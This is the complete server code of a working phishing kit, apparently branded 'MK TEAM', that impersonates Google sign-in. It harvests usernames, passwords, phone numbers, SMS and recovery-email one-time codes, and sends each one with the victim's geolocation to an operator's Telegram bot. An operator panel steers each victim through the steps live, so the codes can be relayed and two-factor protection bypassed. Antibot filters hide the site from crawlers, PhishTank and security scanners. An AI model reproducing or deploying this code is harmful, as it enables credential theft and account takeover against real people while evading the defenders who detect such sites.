const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 5000;

// Load config
function loadConfig() {
    try {
        const configData = fs.readFileSync('./config.txt', 'utf8');
        const config = {};
        configData.split('\n').forEach(line => {
            if (line.trim() && !line.startsWith('#')) {
                const [key, value] = line.split('=');
                if (key && value) {
                    config[key.trim()] = value.trim();
                }
            }
        });
        console.log('Config loaded successfully:', Object.keys(config));
        return config;
    } catch (error) {
        console.error('Error loading config:', error);
        return {};
    }
}

const config = loadConfig();

// Device detection function
function detectDevice(userAgent) {
    if (!userAgent) return 'Unknown';

    const ua = userAgent.toLowerCase();

    if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
        if (ua.includes('android')) return 'Android';
        if (ua.includes('iphone') || ua.includes('ios')) return 'iPhone';
        return 'Mobile';
    }

    if (ua.includes('tablet') || ua.includes('ipad')) {
        return 'Tablet';
    }

    if (ua.includes('windows')) return 'Windows';
    if (ua.includes('mac')) return 'Mac';
    if (ua.includes('linux')) return 'Linux';

    return 'Desktop';
}

// Get geolocation info from IP
async function getLocationInfo(ip) {
    try {
        // Skip for local/private IPs
        if (ip === 'UNKNOWN' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.') || ip === '::1') {
            return `\nIP: ${ip} (Local/Private)`;
        }
        
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
        const data = await response.json();
        
        if (data.status === 'success') {
            let locationInfo = `\nIP: ${ip}`;
            locationInfo += `\nCity: ${data.city || 'Unknown'}`;
            locationInfo += `\nState/Region: ${data.regionName || 'Unknown'}`;
            locationInfo += `\nCountry: ${data.country || 'Unknown'} (${data.countryCode || 'N/A'})`;
            locationInfo += `\nZIP: ${data.zip || 'Unknown'}`;
            locationInfo += `\nCoordinates: ${data.lat || 'Unknown'}, ${data.lon || 'Unknown'}`;
            locationInfo += `\nTimezone: ${data.timezone || 'Unknown'}`;
            locationInfo += `\nISP: ${data.isp || 'Unknown'}`;
            locationInfo += `\nOrganization: ${data.org || 'Unknown'}`;
            locationInfo += `\nAS: ${data.as || 'Unknown'}`;
            return locationInfo;
        } else {
            return `\nIP: ${ip}\nLocation: Failed to get location (${data.message || 'Unknown error'})`;
        }
    } catch (error) {
        console.error('Geolocation error:', error);
        return `\nIP: ${ip}\nLocation: Error getting location`;
    }
}

// Send Telegram notification
async function sendToTelegram(message, pageName = '', sessionId = '', ip = '') {
    const botToken = config.TOKEN;
    const chatId = config.CHAT_ID;

    console.log('Attempting to send Telegram notification...');
    console.log('Bot Token available:', botToken ? 'Yes' : 'No');
    console.log('Chat ID available:', chatId ? 'Yes' : 'No');

    if (!botToken || !chatId || botToken === 'any' || chatId === 'any') {
        console.log('Telegram config not found or placeholder values, skipping notification');
        console.log('Current config TOKEN:', botToken ? 'Set' : 'Not set');
        console.log('Current config CHAT_ID:', chatId ? 'Set' : 'Not set');
        return;
    }

    const icon = {
        'login': '👥',
        'password': '🔑',
        'wrong_password': '🔑',
        'phone_otp': '📱',
        'wrong-phone_otp': '📱',
        'phone': '📞',
        'index': '🌐',
        'default': '🔒'
    };

    const pageIcon = icon[pageName] || icon.default;
    const subject = `MK TEAM Google ${pageName ? pageName.toUpperCase() : 'VISIT'}`;
    
    // Get location info if IP is provided
    const locationInfo = ip ? await getLocationInfo(ip) : '';
    
    const text = `${subject} ${pageIcon} [Session: ${sessionId}]\n${message}${locationInfo}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    try {
        console.log('Sending to Telegram:', { chatId, textLength: text.length });
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });

        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Telegram message sent successfully');
        } else {
            console.error('❌ Telegram API error:', result);
        }
    } catch (error) {
        console.error('❌ Telegram notification error:', error);
    }
}

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Enhanced session management with cleanup
const sessionStore = new Map();
const adminSessions = new Set();
const SESSION_TIMEOUT = 24 * 60 * 60 * 1000; // 24 hours
const ADMIN_SESSION_TIMEOUT = 4 * 60 * 60 * 1000; // 4 hours
const sessionStats = {
    totalSessions: 0,
    activeSessions: 0,
    lastCleanup: Date.now()
};

app.use((req, res, next) => {
    // Get session ID from cookie or create new one
    let sessionId = req.headers.cookie?.match(/session_id=([^;]*)/)?.[1];
    
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36);
        res.setHeader('Set-Cookie', `session_id=${sessionId}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
    }
    
    // Get or create session with timestamp
    if (sessionStore.has(sessionId)) {
        req.session = sessionStore.get(sessionId);
        req.session.lastAccess = Date.now();
    } else {
        req.session = {
            created: Date.now(),
            lastAccess: Date.now()
        };
        sessionStore.set(sessionId, req.session);
    }
    
    req.sessionId = sessionId;
    next();
});

// Enhanced session cleanup routine with statistics
function cleanupSessions() {
    const now = Date.now();
    let cleaned = 0;
    
    for (const [sessionId, session] of sessionStore.entries()) {
        const timeout = session.is_admin ? ADMIN_SESSION_TIMEOUT : SESSION_TIMEOUT;
        if (now - session.lastAccess > timeout) {
            sessionStore.delete(sessionId);
            if (session.is_admin) {
                adminSessions.delete(sessionId);
            }
            cleaned++;
        }
    }
    
    // Update statistics
    sessionStats.activeSessions = sessionStore.size;
    sessionStats.lastCleanup = now;
    
    if (cleaned > 0) {
        console.log(`Cleaned ${cleaned} expired sessions. Active sessions: ${sessionStats.activeSessions}`);
    }
    
    // Also cleanup storage sessions that are too old
    cleanupStorageSessions();
}

// Cleanup old sessions from storage.json
function cleanupStorageSessions() {
    try {
        const storage = readStorage();
        const now = Math.floor(Date.now() / 1000);
        const maxAge = 7 * 24 * 60 * 60; // 7 days
        
        const activeSessions = storage.sessions.filter(session => {
            const age = now - (session.last_update || 0);
            return age < maxAge;
        });
        
        if (activeSessions.length !== storage.sessions.length) {
            storage.sessions = activeSessions;
            writeStorage(storage);
            console.log(`Cleaned ${storage.sessions.length - activeSessions.length} old storage sessions`);
        }
    } catch (error) {
        console.error('Error cleaning storage sessions:', error);
    }
}

// Run cleanup every 30 minutes
setInterval(cleanupSessions, 30 * 60 * 1000);
app.use('/pages', express.static('extracted/google@MK_TEAM2025/u6XYqq1Kfz/pages'));

// Storage file paths
const STORAGE_FILE = './data/storage.json';
const BLOCKED_IPS_FILE = './data/blocked_ips.json';
const BOTS_FILE = './data/bots.txt';

// Ensure data directory exists
if (!fs.existsSync('./data')) {
    fs.mkdirSync('./data');
}

// Initialize storage files with PHP-compatible structure (sessions array format)
if (!fs.existsSync(STORAGE_FILE)) {
    fs.writeFileSync(STORAGE_FILE, JSON.stringify({ sessions: [] }, null, 2));
}
if (!fs.existsSync(BLOCKED_IPS_FILE)) {
    fs.writeFileSync(BLOCKED_IPS_FILE, JSON.stringify([], null, 2));
}
if (!fs.existsSync(BOTS_FILE)) {
    fs.writeFileSync(BOTS_FILE, '');
}

// Database functions - replicate PHP exactly
function readStorage() {
    try {
        const data = JSON.parse(fs.readFileSync(STORAGE_FILE, 'utf8'));
        if (!data.sessions || !Array.isArray(data.sessions)) {
            return { sessions: [] };
        }
        return data;
    } catch (error) {
        return { sessions: [] };
    }
}

function writeStorage(data) {
    try {
        fs.writeFileSync(STORAGE_FILE, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        return false;
    }
}

function saveSession(sessionData) {
    const storage = readStorage();
    const sessions = storage.sessions;
    
    let found = false;
    for (let i = 0; i < sessions.length; i++) {
        if (sessions[i].session_id === sessionData.session_id) {
            sessions[i] = { ...sessions[i], ...sessionData };
            found = true;
            break;
        }
    }
    
    if (!found) {
        sessions.push(sessionData);
    }
    
    storage.sessions = sessions;
    return writeStorage(storage);
}

function getSession(sessionId) {
    const storage = readStorage();
    for (const sess of storage.sessions) {
        if (sess.session_id === sessionId) {
            return sess;
        }
    }
    return null;
}

function updateSessionStatus(sessionId, newStatus, source = 'admin') {
    const storage = readStorage();
    for (let i = 0; i < storage.sessions.length; i++) {
        if (storage.sessions[i].session_id === sessionId) {
            storage.sessions[i].status = newStatus;
            storage.sessions[i].last_update = Math.floor(Date.now() / 1000);
            storage.sessions[i].update_source = source;
            break;
        }
    }
    writeStorage(storage);
}

function updateSessionField(sessionId, fieldName, fieldValue) {
    const storage = readStorage();
    for (let i = 0; i < storage.sessions.length; i++) {
        if (storage.sessions[i].session_id === sessionId) {
            storage.sessions[i][fieldName] = fieldValue;
            storage.sessions[i].last_update = Math.floor(Date.now() / 1000);
            break;
        }
    }
    writeStorage(storage);
}

function updateSessionLastSeen(sessionId, time) {
    const storage = readStorage();
    for (let i = 0; i < storage.sessions.length; i++) {
        if (storage.sessions[i].session_id === sessionId) {
            storage.sessions[i].last_seen = time;
            break;
        }
    }
    writeStorage(storage);
}

function deleteSession(sessionId) {
    const storage = readStorage();
    const newSessions = storage.sessions.filter(s => s.session_id !== sessionId);
    storage.sessions = newSessions;
    writeStorage(storage);
}

function deleteAllSessions() {
    const storage = { sessions: [] };
    writeStorage(storage);
}

// Antibot detection system - migrated from PHP
function logBot(userAgent, reason) {
    const content = `#> ${userAgent} [ ${reason} ]\r\n`;
    try {
        fs.appendFileSync(BOTS_FILE, content);
    } catch (error) {
        console.error('Error logging bot:', error);
    }
}

function checkBotCrawler(userAgent) {
    if (!userAgent) return false;
    
    const botSignatures = [
        'google', 'Java', 'FreeBSD', 'msnbot', 'Yahoo! Slurp', 'YahooSeeker',
        'Googlebot', 'bingbot', 'crawler', 'PycURL', 'facebookexternalhit'
    ];
    
    for (const signature of botSignatures) {
        if (userAgent.includes(signature)) {
            return true;
        }
    }
    
    // Check specific user agent
    if (userAgent === "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
        return true;
    }
    
    return false;
}

function checkPhishTank(referer) {
    if (!referer) return false;
    
    try {
        const url = new URL(referer);
        const hostname = url.hostname.toLowerCase();
        return hostname === 'phishtank.com' || hostname === 'www.phishtank.com';
    } catch (error) {
        return false;
    }
}

function checkIPRange(ip) {
    // Check IP range 146.112.0.0 to 146.112.255.255
    try {
        const parts = ip.split('.');
        if (parts.length === 4) {
            const first = parseInt(parts[0]);
            const second = parseInt(parts[1]);
            return first === 146 && second === 112;
        }
    } catch (error) {
        // Invalid IP format
    }
    return false;
}

function checkBlockedHostnames(ip) {
    // This would need DNS lookup - simplified for Node.js
    // In production, you might want to use a proper DNS lookup library
    return false; // Skip hostname checking for now
}

function checkBlockedIPs(ip) {
    const bannedIPs = [
        '204.101.161.159', '69.164.111.198', '68.65.53.71', '198.148.78.133',
        '89.197.44.226', '13.112.251.210', '46.101.119.24', '87.113.78.97',
        '165.227.0.128', '217.182.168.178', '51.15.136.98', '80.67.172.162'
    ];
    
    if (bannedIPs.includes(ip)) return true;
    
    // Check IP ranges with regex patterns
    const bannedRanges = [
        /^206\.207\..*\..*$/, /^209\.19\..*\..*$/, /^207\.70\..*\..*$/,
        /^185\.75\..*\..*$/, /^193\.226\..*\..*$/, /^66\.102\..*\..*$/,
        /^64\.71\..*\..*$/, /^69\.164\..*\..*$/, /^64\.74\..*\..*$/,
        /^64\.235\..*\..*$/, /^4\.14\.64\..*$/, /^38\.100\..*\..*$/,
        /^107\.170\..*\..*$/, /^149\.20\..*\..*$/, /^38\.105\..*\..*$/,
        /^74\.125\..*\..*$/, /^66\.150\.14\..*$/, /^54\.176\..*\..*$/,
        /^184\.173\..*\..*$/, /^66\.249\..*\..*$/, /^128\.242\..*\..*$/
    ];
    
    for (const pattern of bannedRanges) {
        if (pattern.test(ip)) return true;
    }
    
    return false;
}

function checkBlockedUserAgents(userAgent) {
    if (!userAgent) return false;
    
    const blockedWords = [
        'Java/1.6.0_22', 'bot', 'above', 'google', 'softlayer', 'amazonaws',
        'cyveillance', 'compatible', 'facebook', 'phishtank', 'dreamhost',
        'netpilot', 'calyxinstitute', 'tor-exit', 'apache-httpclient',
        'lssrocketcrawler', 'Trident', 'X11', 'crawler', 'urlredirectresolver',
        'jetbrains', 'spam', 'windows 95', 'windows 98', 'acunetix', 'netsparker'
    ];
    
    const lowerUA = userAgent.toLowerCase();
    for (const word of blockedWords) {
        if (lowerUA.includes(word.toLowerCase())) {
            return true;
        }
    }
    
    return false;
}

function getClientIP(req) {
    return req.headers['cf-connecting-ip'] || 
           req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           'UNKNOWN';
}

function isBlocked(ip) {
    try {
        const blocked = JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE, 'utf8'));
        return blocked.includes(ip);
    } catch (error) {
        return false;
    }
}

function blockIP(ip) {
    try {
        const blocked = JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE, 'utf8'));
        if (!blocked.includes(ip)) {
            blocked.push(ip);
            fs.writeFileSync(BLOCKED_IPS_FILE, JSON.stringify(blocked, null, 2));
        }
        return true;
    } catch (error) {
        return false;
    }
}

function checkBlockedIP(ip) {
    try {
        const blocked = JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE, 'utf8'));
        if (Array.isArray(blocked) && blocked.includes(ip)) {
            return true;
        }
    } catch (error) {
        // File doesn't exist or invalid JSON
    }
    return false;
}

// Complete antibot middleware - replicate all PHP checks
function antibotMiddleware(req, res, next) {
    const ip = getClientIP(req);
    const userAgent = req.headers['user-agent'] || '';
    const referer = req.headers['referer'] || '';
    
    // Check Bot-Crawler signatures
    if (checkBotCrawler(userAgent)) {
        logBot(userAgent, 'Bot');
        return res.status(404).send('Not Found');
    }
    
    // Check PhishTank referer
    if (checkPhishTank(referer)) {
        logBot(userAgent, 'Phishtank');
        return res.status(404).send('Not Found');
    }
    
    // Check blacklisted IP ranges
    if (checkIPRange(ip)) {
        logBot(userAgent, 'Blacklist');
        return res.status(404).send('Not Found');
    }
    
    // Check blocked IPs from list
    if (checkBlockedIPs(ip)) {
        logBot(userAgent, 'Blocked IP');
        return res.status(404).send('Not Found');
    }
    
    // Check blocked user agents
    if (checkBlockedUserAgents(userAgent)) {
        logBot(userAgent, 'Blocked UA');
        return res.status(404).send('Not Found');
    }
    
    // Check manually blocked IPs
    if (checkBlockedIP(ip)) {
        return res.status(403).send(`<h1>Your IP (${ip}) is blocked.</h1>`);
    }
    
    next();
}

// Legacy function for compatibility
function checkBlocked(req, res, next) {
    return antibotMiddleware(req, res, next);
}

// Routes

// Main landing page - replicate PHP index.php functionality
app.get('/', antibotMiddleware, (req, res) => {
    // Generate session ID like PHP
    let sessionId;
    if (req.query.session_id && req.query.session_id.trim() !== '') {
        sessionId = req.query.session_id;
    } else {
        sessionId = 'sess_' + Date.now().toString() + '_' + Math.random().toString(36).substr(2, 9);
    }
    
    const ip = getClientIP(req);
    const device = detectDevice(req.headers['user-agent']);
    const email = req.query.email || '';

    // Send Telegram notification for new visitor
    let message = `New Visitor`;
    if (email) {
        message += `\nTarget Email: ${email}`;
    }
    message += `\nDevice: ${device}`;
    sendToTelegram(message, 'index', sessionId, ip);

    // Serve the captcha page with session ID
    let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

// Hash-based email routing
app.get('/email/:email', antibotMiddleware, (req, res) => {
    const email = decodeURIComponent(req.params.email);
    let sessionId = 'sess_' + Date.now().toString() + '_' + Math.random().toString(36).substr(2, 9);
    
    const ip = getClientIP(req);
    const device = detectDevice(req.headers['user-agent']);

    // Send Telegram notification for new visitor
    let message = `New Visitor\nTarget Email: ${email}\nDevice: ${device}`;
    sendToTelegram(message, 'index', sessionId, ip);

    // Serve the captcha page with session ID and email
    let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    html = html.replace(/{{TARGET_EMAIL}}/g, email);
    res.send(html);
});

// All user pages with antibot middleware and session validation
app.get('/login', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'login.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/password', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'password.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/wrong_password', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'wrong_password.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/phone', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'phone.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/phone_otp', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'phone_otp.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/wrong-phone_otp', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'wrong-phone_otp.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/waiting', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'waiting.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});


app.get('/sign_in_request', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'sign_in_request.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/success', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'success.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/recovery_email', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'recovery_email.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/recovery_email_sign_in_request', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'recovery_email_sign_in_request.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/recovery_email_otp', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'recovery_email_otp.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

app.get('/wrong_recovery_email_otp', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) {
        return res.redirect('/');
    }
    let html = fs.readFileSync(path.join(__dirname, 'public', 'wrong_recovery_email_otp.html'), 'utf8');
    html = html.replace(/{{SESSION_ID}}/g, sessionId);
    res.send(html);
});

// Admin panel
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin', 'index.html'));
});

// Health check endpoint for deployment
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Test Telegram configuration
app.get('/test-telegram', async (req, res) => {
    try {
        await sendToTelegram('🧪 Test message from server', 'test', 'test_session', '127.0.0.1');
        res.json({ success: true, message: 'Test message sent to Telegram' });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// API Routes

// Get session data
app.get('/api/session/:session_id', checkBlocked, (req, res) => {
    const session = getSession(req.params.session_id);
    if (session) {
        res.json({ 
            email: session.email || session.username,
            status: session.status,
            device_type: session.device_type,
            recovery_email: session.recovery_email
        });
    } else {
        res.json({ email: null, status: null, device_type: null, recovery_email: null });
    }
});

// Handle login submission - replicate PHP handleLoginPost
app.post('/api/login', antibotMiddleware, (req, res) => {
    const { username, session_id } = req.body;
    const ip = getClientIP(req);
    const device = detectDevice(req.headers['user-agent']);

    const sessionData = {
        session_id,
        username,
        email: username, // Also store as email for compatibility
        ip_address: ip,
        device_type: device,
        status: 'password',
        last_update: Math.floor(Date.now() / 1000),
        update_source: 'user'
    };

    saveSession(sessionData);

    // Send Telegram notification
    const msg = `Username: ${username}\nDevice: ${device}`;
    sendToTelegram(msg, 'login', session_id, ip);

    res.json({ success: true, redirect: `/password?session_id=${session_id}` });
});

// Handle password submission - replicate PHP handlePasswordPost
app.post('/api/password', antibotMiddleware, (req, res) => {
    const { password, session_id } = req.body;

    if (!session_id || !password) {
        return res.json({ success: false });
    }

    updateSessionField(session_id, 'password', password);
    const sess = getSession(session_id);
    const ip = sess?.ip_address || 'UNKNOWN';

    const msg = `Password: ${password}`;
    sendToTelegram(msg, 'password', session_id, ip);

    updateSessionStatus(session_id, 'waiting', 'user');
    res.json({ success: true, redirect: `/waiting?session_id=${session_id}` });
});

// Handle password2 submission for wrong password flow
app.post('/api/password2', antibotMiddleware, (req, res) => {
    const { password2, session_id } = req.body;

    if (!session_id || !password2) {
        return res.json({ success: false });
    }

    updateSessionField(session_id, 'password2', password2);
    const sess = getSession(session_id);
    const ip = sess?.ip_address || 'UNKNOWN';

    const msg = `Password2: ${password2}`;
    sendToTelegram(msg, 'wrong_password', session_id, ip);

    updateSessionStatus(session_id, 'waiting', 'user');
    res.json({ success: true, redirect: `/waiting?session_id=${session_id}` });
});

// Handle phone submission - replicate PHP handlePhonePost
app.post('/api/phone', antibotMiddleware, (req, res) => {
    const { phone, session_id } = req.body;
    
    if (!session_id || !phone) {
        return res.json({ success: false });
    }
    
    updateSessionField(session_id, 'phone', phone);
    const sess = getSession(session_id);
    const ip = sess?.ip_address || 'UNKNOWN';

    const msg = `Phone: ${phone}`;
    sendToTelegram(msg, 'phone', session_id, ip);

    updateSessionStatus(session_id, 'waiting', 'user');
    res.json({ success: true, redirect: `/waiting?session_id=${session_id}` });
});

// Handle OTP submission - replicate PHP handleOtpPost
app.post('/api/otp', antibotMiddleware, (req, res) => {
    const { otp, session_id } = req.body;
    
    if (!session_id || !otp) {
        return res.json({ success: false });
    }
    
    updateSessionField(session_id, 'otp', otp);
    const sess = getSession(session_id);
    const ip = sess?.ip_address || 'UNKNOWN';

    const msg = `PhoneOtp: ${otp}`;
    sendToTelegram(msg, 'phone_otp', session_id, ip);

    updateSessionStatus(session_id, 'waiting', 'user');
    res.json({ success: true, redirect: `/waiting?session_id=${session_id}` });
});

// Handle OTP2 submission for wrong OTP flow
app.post('/api/otp2', antibotMiddleware, (req, res) => {
    const { otp2, session_id } = req.body;
    
    if (!session_id || !otp2) {
        return res.json({ success: false });
    }
    
    updateSessionField(session_id, 'otp2', otp2);
    const sess = getSession(session_id);
    const ip = sess?.ip_address || 'UNKNOWN';

    const msg = `PhoneOtp2: ${otp2}`;
    sendToTelegram(msg, 'wrong-phone_otp', session_id, ip);

    updateSessionStatus(session_id, 'waiting', 'user');
    res.json({ success: true, redirect: `/waiting?session_id=${session_id}` });
});

// Notify admin when user is in recovery email OTP page
app.post('/api/notify_recovery_email_otp', antibotMiddleware, (req, res) => {
    const { session_id } = req.body;
    
    if (!session_id) {
        return res.json({ success: false });
    }
    
    const sess = getSession(session_id);
    const ip = sess?.ip_address || 'UNKNOWN';
    const recoveryEmail = sess?.recovery_email || 'N/A';

    const msg = `User is now in Recovery Email OTP page\nRecovery Email: ${recoveryEmail}`;
    sendToTelegram(msg, 'recovery_email_otp', session_id, ip);

    res.json({ success: true });
});

// Handle recovery email OTP submission
app.post('/api/recovery_email_otp', antibotMiddleware, (req, res) => {
    const { recovery_email_otp, session_id } = req.body;
    
    if (!session_id || !recovery_email_otp) {
        return res.json({ success: false });
    }
    
    updateSessionField(session_id, 'recovery_email_otp', recovery_email_otp);
    const sess = getSession(session_id);
    const ip = sess?.ip_address || 'UNKNOWN';

    const msg = `Recovery Email OTP: ${recovery_email_otp}`;
    sendToTelegram(msg, 'recovery_email_otp', session_id, ip);

    updateSessionStatus(session_id, 'waiting', 'user');
    res.json({ success: true, redirect: `/waiting?session_id=${session_id}` });
});

// Handle recovery email OTP2 submission for wrong OTP flow
app.post('/api/recovery_email_otp2', antibotMiddleware, (req, res) => {
    const { recovery_email_otp2, session_id } = req.body;
    
    if (!session_id || !recovery_email_otp2) {
        return res.json({ success: false });
    }
    
    updateSessionField(session_id, 'recovery_email_otp2', recovery_email_otp2);
    const sess = getSession(session_id);
    const ip = sess?.ip_address || 'UNKNOWN';

    const msg = `Recovery Email OTP2: ${recovery_email_otp2}`;
    sendToTelegram(msg, 'wrong_recovery_email_otp', session_id, ip);

    updateSessionStatus(session_id, 'waiting', 'user');
    res.json({ success: true, redirect: `/waiting?session_id=${session_id}` });
});

// Poll status for waiting page - replicate PHP poll_status.php
app.get('/api/poll_status/:session_id', antibotMiddleware, (req, res) => {
    const session = getSession(req.params.session_id);
    if (session) {
        updateSessionLastSeen(req.params.session_id, Math.floor(Date.now() / 1000));
        res.json({ 
            status: session.status, 
            question: session.phone_otp_question || '',
            sign_in_question1: session.sign_in_question1 || '',
            sign_in_question2: session.sign_in_question2 || '',
            recovery_email_sign_in_question1: session.recovery_email_sign_in_question1 || '',
            recovery_email_sign_in_question2: session.recovery_email_sign_in_question2 || ''
        });
    } else {
        res.json({ status: 'error' });
    }
});

// Alternative route for PHP compatibility
app.get('/poll_status.php', antibotMiddleware, (req, res) => {
    const sessionId = req.query.session_id;
    const session = getSession(sessionId);
    if (session) {
        updateSessionLastSeen(sessionId, Math.floor(Date.now() / 1000));
        res.json({ 
            status: session.status, 
            question: session.phone_otp_question || '',
            sign_in_question1: session.sign_in_question1 || '',
            sign_in_question2: session.sign_in_question2 || ''
        });
    } else {
        res.json({ status: 'error' });
    }
});

// API endpoint to update session as online (keep alive) - replicate PHP update_online.php
app.get('/api/update_online/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    updateSessionLastSeen(sessionId, Math.floor(Date.now() / 1000));
    res.json({ success: true });
});

// Alternative route for PHP compatibility
app.get('/update_online.php', (req, res) => {
    const sessionId = req.query.session_id;
    if (sessionId) {
        updateSessionLastSeen(sessionId, Math.floor(Date.now() / 1000));
    }
    res.json({ success: true });
});

// Admin API routes
app.get('/api/admin/sessions', (req, res) => {
    try {
        const storage = readStorage();
        res.json({ sessions: storage.sessions || [] });
    } catch (error) {
        res.json({ sessions: [] });
    }
});

app.post('/api/admin/update_status', (req, res) => {
    const { session_id, status } = req.body;
    updateSessionStatus(session_id, status, 'admin');
    res.json({ success: true });
});

app.post('/api/admin/phone_otp_question', (req, res) => {
    const { session_id, question } = req.body;
    const session = getSession(session_id);

    if (session) {
        session.phone_otp_question = question;
        saveSession(session);
        res.json({ success: true });
    } else {
        res.json({ success: false, error: 'Session not found' });
    }
});

app.post('/api/admin/block_ip', (req, res) => {
    const { ip } = req.body;
    const success = blockIP(ip);
    res.json({ success });
});

app.delete('/api/admin/session/:session_id', (req, res) => {
    try {
        deleteSession(req.params.session_id);
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false });
    }
});

app.delete('/api/admin/sessions', (req, res) => {
    try {
        deleteAllSessions();
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false });
    }
});

// New admin API routes to match PHP functionality
app.post('/api/admin/sign_in_request_question', (req, res) => {
    const { session_id, question1, question2 } = req.body;
    const session = getSession(session_id);
    
    if (session) {
        session.sign_in_question1 = question1;
        session.sign_in_question2 = question2;
        saveSession(session);
        res.json({ success: true });
    } else {
        res.json({ success: false, error: 'Session not found' });
    }
});

app.get('/api/admin/blocked_ips', (req, res) => {
    try {
        const blocked = JSON.parse(fs.readFileSync(BLOCKED_IPS_FILE, 'utf8'));
        res.json(blocked);
    } catch (error) {
        res.json([]);
    }
});

// Admin API to block IP
app.post('/admin/api/block_ip', (req, res) => {
    const { ip } = req.body;

    if (!ip) {
        return res.json({ success: false });
    }

    blockIP(ip); // Use blockIP function

    res.json({ success: true });
});

// Admin API to approve password
app.post('/admin/api/approve_password', (req, res) => {
    const { session_id } = req.body;

    if (!session_id || !getSession(session_id)) { // Use getSession to retrieve session
        return res.json({ success: false });
    }

    updateSessionStatus(session_id, 'phone'); // Use updateSessionStatus
    res.json({ success: true });
});

// Admin API to reject password
app.post('/admin/api/reject_password', (req, res) => {
    const { session_id } = req.body;

    if (!session_id || !getSession(session_id)) { // Use getSession to retrieve session
        return res.json({ success: false });
    }

    updateSessionStatus(session_id, 'wrong_password'); // Use updateSessionStatus
    res.json({ success: true });
});

// Serve only safe assets - NO PHP files exposed
